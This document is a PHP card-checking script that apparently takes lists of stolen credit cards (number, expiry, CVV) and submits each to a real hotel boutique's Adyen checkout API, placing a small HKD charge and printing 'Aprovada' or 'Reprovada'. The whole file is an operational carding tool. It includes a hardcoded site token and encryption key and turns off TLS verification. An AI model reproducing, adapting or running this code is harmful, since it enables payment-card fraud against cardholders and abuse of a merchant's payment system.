<?php
ignore_user_abort();
error_reporting(0);
session_start();

$lista = $_GET['lista'];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

// Configuración básica
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$site_login_token = "beQDmTL1oVRPZmOLWQdnFXCtRC4Eu5M81h3KtAiWIM0VMTki7RXw9RPrFlXLhoP42a5YNETYAcPVdmv8";

// 1. Crear orden
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_endpoint . "/checkout_init.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
curl_setopt($ch, CURLOPT_POST, 1);

$init_data = array(
    "client_id" => "14",
    "promotion_id" => "1",
    "lang" => "en",
    "site_login_token" => $site_login_token,
    "hotel_code" => "ISL",
    "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
    "order_amount" => 100,
    "payment_method" => "adyen"
);

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($init_data));
$init_response = curl_exec($ch);
curl_close($ch);

$init_result = json_decode($init_response, true);

if (!isset($init_result['order_number'])) {
    die('Reprovada');
}

$order_number = $init_result['order_number'];
$order_token = $init_result['order_token'];

// 2. Encriptar
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_endpoint . "/adyen_encrypt.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
curl_setopt($ch, CURLOPT_POST, 1);

$encrypt_data = array(
    "client_id" => "14",
    "promotion_id" => "1",
    "lang" => "en",
    "site_login_token" => $site_login_token,
    "order_number" => $order_number,
    "order_token" => $order_token,
    "card" => $cc,
    "month" => $mes,
    "year" => $ano,
    "cvv" => $cvv,
    "adyen_key" => "10001|EA9DDE733BC69B0DF0AA6AAB6CAC1A8EE7D2D5BA830C670D2EABF9133B098A88BE1F8ABBDD999BA3A5B36465941FE09D95A4A9A1A53C815583DA1932C926B5C8F4023A183CEF755DE196D2FA9474F97DB47B4647A45D35AB9198EC492006C999680E0592005F1C1400B041ECE0282FF58BCD66DFA4B98CC262E0A450DD623FB57A4F2C05A624958F02F4D764FAE903362EC07457A970F9F64512AA8DC6008CEC94C1A675F6432BC1070BCB311462FB52EC23B3FE568A7D7B154506C91544671A43729520C448698CF590A6682F2BB4BDC95B9267361266A57EC68EC0830AD6ECDCC3447C049578787601685B98926471BE6F5BF1E8A1E97FD13009844A0B82E7",
    "adyen_version" => "_0_1_25"
);

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($encrypt_data));
$encrypted_response = curl_exec($ch);
curl_close($ch);

$encrypted_data = json_decode($encrypted_response, true);

if (!isset($encrypted_data['encryptedCardNumber'])) {
    die('Reprovada');
}

// 3. Procesar
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_endpoint . "/adyen_process.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
curl_setopt($ch, CURLOPT_POST, 1);

$process_data = array(
    "client_id" => "14",
    "promotion_id" => "1",
    "lang" => "en",
    "site_login_token" => $site_login_token,
    "order_number" => $order_number,
    "order_token" => $order_token,
    "hotel_code" => "ISL",
    "encryptedCardNumber" => $encrypted_data['encryptedCardNumber'],
    "encryptedExpiryMonth" => $encrypted_data['encryptedExpiryMonth'],
    "encryptedExpiryYear" => $encrypted_data['encryptedExpiryYear'],
    "encryptedSecurityCode" => $encrypted_data['encryptedSecurityCode'],
    "amount" => array("value" => 100, "currency" => "HKD"),
    "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
    "payment_method" => "adyen",
    "card_type" => "Visa"
);

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($process_data));
$process_response = curl_exec($ch);
curl_close($ch);

$process_result = json_decode($process_response, true);

if (isset($process_result['resultCode']) && $process_result['resultCode'] == 'Authorised') {
    echo 'Aprovada';
} else {
    echo 'Reprovada';
}
?>